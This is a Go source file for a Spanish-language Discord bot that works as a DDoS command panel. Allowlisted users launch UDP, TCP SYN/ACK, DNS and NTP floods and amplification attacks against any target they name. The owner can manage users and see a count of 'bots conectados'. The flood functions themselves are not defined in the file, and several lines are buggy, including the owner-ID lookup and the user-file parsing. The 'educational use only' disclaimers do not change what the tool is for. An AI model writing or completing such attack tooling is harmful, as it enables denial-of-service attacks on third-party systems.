package main

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"strings"
	"sync"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

var (
	// Lista de usuarios permitidos para ejecutar ataques
	allowedUsers   = make(map[string]bool)
	allowedUsersMu sync.RWMutex
	// Token del bot
	Token string

	// OwnerID
	OwnerID string
)

// init
func init() {
	// Cargar variables de entorno desde el archivo .env
	err := godotenv.Load()
	if err != nil {
		log.Println("Advertencia: No se encontró el archivo .env. Se usarán variables de entorno del sistema.")
	}
	// Cargar el token del bot desde las variables de entorno
	Token = os.Getenv("DISCORD_TOKEN")
	if Token == "" {
		log.Fatal("Error: DISCORD_TOKEN no está definido en las variables de entorno.")
		return
	}

	// Cargar el ID del owner desde las variables de entorno
	OwnerID = os.Getenv("1422676828161703956")
	if OwnerID == "" {
		log.Println("Advertencia: OWNER_ID no está definido, algunas funciones estarán restringidas.")
	}

	// Cargar la lista de usuarios permitidos desde un archivo
	loadAllowedUsers()
}

// ayudaCommand
func ayudaCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
	message := `
**Lista de comandos:**
*   \`!ayuda\`: Muestra esta lista de comandos.
*   \`!methods\`: Muestra los métodos de ataque disponibles.
*   \`!adduser <usuario>\`: Agrega un usuario a la lista de usuarios permitidos (solo para el owner).
*   \`!deleteuser <usuario>\`: Elimina un usuario de la lista de usuarios permitidos (solo para el owner).
*   \`!ataque <método> <objetivo> <duración>\`: Inicia un ataque DDoS (requiere permisos).
*   \`!bots\`: Muestra la cantidad de bots conectados (solo para el owner).
	`
	s.ChannelMessageSend(m.ChannelID, message)
}

// methodsCommand
func methodsCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
	message := `
**Métodos de ataque disponibles:**
*   \`udp-pps\`: UDP Flood (paquetes por segundo)
*   \`udp-sockets\`: UDP Flood (sockets múltiples)
*   \`udp-query\`: UDP Query Flood
*   \`udp-bypass\`: UDP Bypass
*   \`tcp-ack\`: TCP ACK Flood
*   \`tcp-syn\`: TCP SYN Flood
*   \`dns\`: DNS Flood
*   \`ntp\`: NTP Flood
*   \`dns-amp\`: DNS Amplification Attack
*   \`ntp-amp\`: NTP Amplification Attack
*   \`mix-amp\`: Ataque de amplificación mixto
	`
	s.ChannelMessageSend(m.ChannelID, message)
}

// addUserCommand
func addUserCommand(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if m.Author.ID != OwnerID {
		s.ChannelMessageSend(m.ChannelID, "No tienes permiso para usar este comando.")
		return
	}

	if len(args) < 2 {
		s.ChannelMessageSend(m.ChannelID, "Uso: !adduser <usuario>")
		return
	}

	user := args[1]

	allowedUsersMu.Lock()
	allowedUsers[user] = true
	allowedUsersMu.Unlock()

	saveAllowedUsers()

	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Usuario %s agregado a la lista de usuarios permitidos.", user))
}

// deleteUserCommand
func deleteUserCommand(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	if m.Author.ID != OwnerID {
		s.ChannelMessageSend(m.ChannelID, "No tienes permiso para usar este comando.")
		return
	}

	if len(args) < 2 {
		s.ChannelMessageSend(m.ChannelID, "Uso: !deleteuser <usuario>")
		return
	}

	user := args[1]

	allowedUsersMu.Lock()
	delete(allowedUsers, user)
	allowedUsersMu.Unlock()

	saveAllowedUsers()

	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Usuario %s eliminado de la lista de usuarios permitidos.", user))
}

// ataqueCommand
func ataqueCommand(s *discordgo.Session, m *discordgo.MessageCreate, args []string) {
	// Verificar si el usuario tiene permiso para ejecutar ataques
	if !hasPermission(m.Author.ID) {
		s.ChannelMessageSend(m.ChannelID, "No tienes permiso para ejecutar ataques.")
		return
	}

	if len(args) < 4 {
		s.ChannelMessageSend(m.ChannelID, "Uso: !ataque <método> <objetivo> <duración>")
		return
	}

	method := args[1]
	target := args[2]
	durationStr := args[3]

	duration, err := strconv.Atoi(durationStr)
	if err != nil {
		s.ChannelMessageSend(m.ChannelID, "La duración debe ser un número entero.")
		return
	}

	// WARNING: Ataques DDoS son ilegales y pueden tener graves consecuencias.
	// Úsalo con fines educativos y de investigación solamente.
	// NUNCA lo uses para dañar sistemas reales.
	s.ChannelMessageSend(m.ChannelID, "¡ADVERTENCIA! Estás a punto de iniciar un ataque DDoS. Esto es ilegal y puede tener graves consecuencias. Úsalo con fines educativos y de investigación solamente. NUNCA lo uses para dañar sistemas reales.")

	go func() {
		err := executeAttack(method, target, duration)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Error al ejecutar el ataque: %s", err))
		} else {
			s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Ataque %s iniciado contra %s durante %d segundos.", method, target, duration))
		}
	}()
}

// botsCommand
func botsCommand(s *discordgo.Session, m *discordgo.MessageCreate) {
	if m.Author.ID != OwnerID {
		s.ChannelMessageSend(m.ChannelID, "No tienes permiso para usar este comando.")
		return
	}

	// Aquí debes agregar la lógica para obtener la cantidad de bots conectados.
	numBots := getNumberOfBots()
	s.ChannelMessageSend(m.ChannelID, fmt.Sprintf("Número de bots conectados: %d", numBots))
}

// hasPermission
func hasPermission(userID string) bool {
	allowedUsersMu.RLock()
	defer allowedUsersMu.RUnlock()
	return allowedUsers[userID] || userID == OwnerID
}

func getNumberOfBots() int {
	// Aquí debes agregar la lógica para obtener la cantidad de bots conectados.
	// Puedes usar una base de datos o un archivo para almacenar la lista de bots.
	// En este ejemplo, devolvemos un valor fijo.
	return 10
}

// executeAttack
func executeAttack(method string, target string, duration int) error {
	// WARNING: Ataques DDoS son ilegales y pueden tener graves consecuencias.
	// Úsalo con fines educativos y de investigación solamente.
	// NUNCA lo uses para dañar sistemas reales.
	log.Printf("Iniciando ataque %s contra %s durante %d segundos.\n", method, target, duration)

	switch method {
	case "udp-pps":
		return UDPFlood(target, duration)
	case "udp-sockets":
		return UDPSockets(target, duration)
	case "udp-query":
		return UDPQuery(target, duration)
	case "udp-bypass":
		return UDPBypass(target, duration)
	case "tcp-ack":
		return TCPAck(target, duration)
	case "tcp-syn":
		return TCPSyn(target, duration)
	case "dns":
		return DNSFlood(target, duration)
	case "ntp":
		return NTPFlood(target, duration)
	case "dns-amp":
		return DNSAmplification(target, duration)
	case "ntp-amp":
		return NTPAmplification(target, duration)
	case "mix-amp":
		return MixedAmplification(target, duration)
	default:
		return fmt.Errorf("Método de ataque desconocido: %s", method)
	}
}

// loadAllowedUsers
func loadAllowedUsers() {
	file, err := os.Open("allowed_users.txt")
	if err != nil {
		if os.IsNotExist(err) {
			// El archivo no existe, se creará al guardar la lista.
			return
		}
		log.Printf("Error al abrir el archivo de usuarios permitidos: %s\n", err)
		return
	}
	defer file.Close()

	var users []string
	_, err = fmt.Fscan(file, &users)
	if err != nil {
		log.Printf("Error al leer el archivo de usuarios permitidos: %s\n", err)
		return
	}

	allowedUsersMu.Lock()
	defer allowedUsersMu.Unlock()
	for _, user := range users {
		allowedUsers[user] = true
	}
}

// saveAllowedUsers
func saveAllowedUsers() {
	file, err := os.Create("allowed_users.txt")
	if err != nil {
		log.Printf("Error al crear/abrir el archivo de usuarios permitidos: %s\n", err)
		return
	}
	defer file.Close()

	allowedUsersMu.RLock()
	defer allowedUsersMu.RUnlock()

	var users []string
	for user := range allowedUsers {
		users = append(users, user)
	}

	_, err = fmt.Fprint(file, strings.Join(users, "\n"))

	if err != nil {
		log.Printf("Error al escribir en el archivo de usuarios permitidos: %s\n", err)
	}
}
